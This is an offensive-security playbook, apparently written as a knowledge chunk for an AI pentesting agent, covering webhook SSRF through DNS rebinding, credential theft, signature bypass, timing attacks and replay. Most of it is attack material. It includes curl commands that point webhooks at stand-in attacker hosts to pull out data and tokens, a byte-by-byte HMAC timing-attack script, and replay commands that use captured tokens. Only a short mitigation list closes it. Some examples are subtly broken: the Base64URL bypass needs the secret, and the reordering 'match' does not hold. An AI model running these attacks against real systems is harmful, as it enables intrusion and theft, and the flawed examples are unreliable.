# Webhook SSRF, Replay & Signature Bypass — Agent Chunk 80a
> Source: CVE databases (2025-2026), Jenkins/Atlantis/GitLab advisories, TOCTOU research, webhook security audits
> Purpose: Teaches the agent to identify and exploit webhook-related vulnerabilities including SSRF, credential theft, replay attacks, and signature timing bypasses
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing webhook endpoints for SSRF, replay attacks, or signature verification weaknesses. Webhook URLs are high-value targets because they often have server-side network access and process untrusted payloads. Test in order: SSRF via URL manipulation, signature bypass, then replay attacks.

---

## 1. Webhook SSRF via DNS Rebinding

### Attack Principle
Webhooks that validate the destination URL at configuration time but resolve DNS again at delivery time are vulnerable to DNS rebinding (TOCTOU — Time-of-Check-Time-of-Use).

**Attack Flow:**
```
1. Attacker configures webhook URL: https://attacker-rebind.example.com/hook
2. First DNS resolution (validation): resolves to 93.184.216.34 (public IP) -> passes check
3. DNS TTL expires (set to 0 or 1 second)
4. Webhook fires, second DNS resolution: resolves to 169.254.169.254 (AWS metadata)
5. Server sends webhook payload to internal service
```

### CVE: MLflow SSRF via Webhook
```bash
# MLflow allowed registering webhook URLs pointing to internal services
# after DNS rebinding
curl -X POST https://mlflow.target.com/api/2.0/mlflow/registry-webhooks/create \
  -H "Content-Type: application/json" \
  -d '{
    "events": ["MODEL_VERSION_CREATED"],
    "http_url_spec": {
      "url": "https://rebind.attacker.com/hook"
    }
  }'
# rebind.attacker.com alternates between public IP and 169.254.169.254
```

### CVE: StellarEduPay SSRF
```bash
# Payment callback webhook URL accepted internal addresses after rebinding
curl -X POST https://stellaredupay.target.com/api/webhook/configure \
  -d '{"callback_url": "https://rebind.attacker.com/callback"}'
# Callback delivers payment data to attacker-controlled endpoint
# that has rebinded to internal payment processing service
```

### CVE: Fider — TOCTOU Flaw
Fider validated webhook URLs against a blocklist of internal IPs, but the DNS resolution at validation time differed from delivery time. The rebinding window was exploitable because:
1. URL validation resolved DNS and checked against internal ranges
2. HTTP client resolved DNS independently seconds later
3. No DNS pinning was implemented

---

## 2. Data Exfiltration via Webhook Delivery Logs

### CVE-2025-64522: Soft Serve Git Server
```bash
# Soft Serve exposed webhook delivery logs including response bodies
# Attacker configures webhook pointing to their server, which echoes
# the full request in the response body

# Step 1: Register webhook that captures secrets in transit
curl -X POST https://softserve.target.com/api/webhooks \
  -d '{"url": "https://attacker.com/log", "events": ["push"]}'

# Step 2: Webhook delivery includes repository content, tokens
# Step 3: Delivery logs (accessible to other users) expose the response
# containing the echoed secrets

# Access delivery logs
curl https://softserve.target.com/api/webhooks/1/deliveries
# Returns full request/response including secrets
```

---

## 3. Credential Theft via Webhook Configuration

### CVE-2026-12726: AWX (Ansible Tower) — GitHub PAT Theft
```bash
# AWX stored GitHub Personal Access Tokens in webhook configuration
# Accessible to users with lower privilege than intended

# Step 1: List webhook configurations (requires project-level access only)
curl -H "Authorization: Bearer <low_priv_token>" \
  https://awx.target.com/api/v2/notification_templates/

# Response includes GitHub PAT in webhook headers:
{
  "id": 5,
  "notification_type": "webhook",
  "notification_configuration": {
    "url": "https://api.github.com/repos/org/repo/dispatches",
    "headers": {
      "Authorization": "token ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
    }
  }
}
# Step 2: Use stolen PAT to access GitHub repositories
```

---

## 4. Replay Attacks with Canonicalization Bypass

### CVE-2026-41351 & CVE-2026-41395: OpenClaw
**Base64 vs Base64URL Signature Bypass:**
```python
# OpenClaw used Base64 for HMAC signature but attacker could submit Base64URL
# The verification decoded both formats, but the canonical form differed

import hmac, hashlib, base64

payload = b'{"event":"payment","amount":100}'
secret = b'webhook_secret'

# Legitimate signature (Base64)
sig_b64 = base64.b64encode(
    hmac.new(secret, payload, hashlib.sha256).digest()
).decode()
# Result: "abc+def/ghi="

# Attacker modifies payload and recomputes with Base64URL
modified_payload = b'{"event":"payment","amount":999}'
sig_b64url = base64.urlsafe_b64encode(
    hmac.new(secret, modified_payload, hashlib.sha256).digest()
).decode()
# Result uses - and _ instead of + and /
# Server accepted both encoding formats
```

**Parameter Reordering Attack:**
```python
# CVE-2026-41395: Signature computed on sorted parameters
# but payload processed with original order

# Signed payload (sorted):
signed = "amount=100&event=payment&user=alice"
signature = hmac.new(secret, signed.encode(), hashlib.sha256).hexdigest()

# Reordered payload (processed differently by backend):
# Backend uses first occurrence, signature uses sorted
attack = "user=admin&amount=100&event=payment&user=alice"
# Signature matches (sorted: amount=100&event=payment&user=admin...user=alice)
# But backend processes user=admin (first occurrence)
```

---

## 5. Timing Attack on Signature Verification

### CVE-2026-70437: Jenkins Webhook Signature Bypass
```python
# Jenkins used string comparison (==) instead of constant-time comparison
# for webhook HMAC verification

# Vulnerable code pattern:
def verify_signature(payload, signature, secret):
    expected = hmac.new(secret, payload, hashlib.sha256).hexdigest()
    return expected == signature  # VULNERABLE: timing side-channel

# Attack: Byte-by-byte signature discovery
# Measure response time for each byte position
import time, requests

known = ""
for position in range(64):  # SHA-256 hex = 64 chars
    best_time = 0
    best_char = ""
    for c in "0123456789abcdef":
        candidate = known + c + "0" * (63 - position)
        times = []
        for _ in range(100):
            start = time.perf_counter_ns()
            requests.post(url, data=payload,
                         headers={"X-Hub-Signature-256": f"sha256={candidate}"})
            elapsed = time.perf_counter_ns() - start
            times.append(elapsed)
        avg = sum(times) / len(times)
        if avg > best_time:
            best_time = avg
            best_char = c
    known += best_char
```

### CVE-2022-24912: Atlantis Webhook
```bash
# Atlantis (Terraform automation) used non-constant-time comparison
# for GitHub/GitLab/Bitbucket webhook secrets
# Combined with network proximity (same cloud region), timing attack
# was practical within ~10000 requests per byte
```

---

## 6. Missing Timestamp Validation — GitLab Webhooks

```bash
# GitLab webhook payloads lack a timestamp field
# This means captured webhook payloads can be replayed indefinitely

# Step 1: Capture a legitimate webhook delivery (via MITM, logs, etc.)
# Step 2: Replay the exact payload + signature at any future time
curl -X POST https://target.com/api/webhooks/gitlab \
  -H "X-Gitlab-Token: <captured_token>" \
  -H "X-Gitlab-Event: Push Hook" \
  -d @captured_payload.json
# No timestamp = no replay protection
# The payload is valid forever as long as the secret hasn't rotated
```

**Contrast with GitHub (has replay protection):**
```
X-Hub-Signature-256: sha256=<hmac>
X-GitHub-Delivery: <uuid>          # Unique delivery ID
# GitHub recommends checking delivery ID for replay, but timestamp
# is not in the signed payload either
```

---

## 7. Mitigation Checklist
- Implement DNS pinning: resolve once and reuse the IP for the connection
- Block internal IP ranges (RFC 1918, link-local, loopback) at the HTTP client level
- Use `hmac.compare_digest()` (Python) or equivalent constant-time comparison
- Include a timestamp in signed webhook payloads; reject if older than 5 minutes
- Never expose webhook delivery logs containing response bodies
- Encrypt stored webhook secrets; redact from API responses
- Canonicalize payload encoding before signature verification
- Include a nonce/delivery ID and reject duplicates
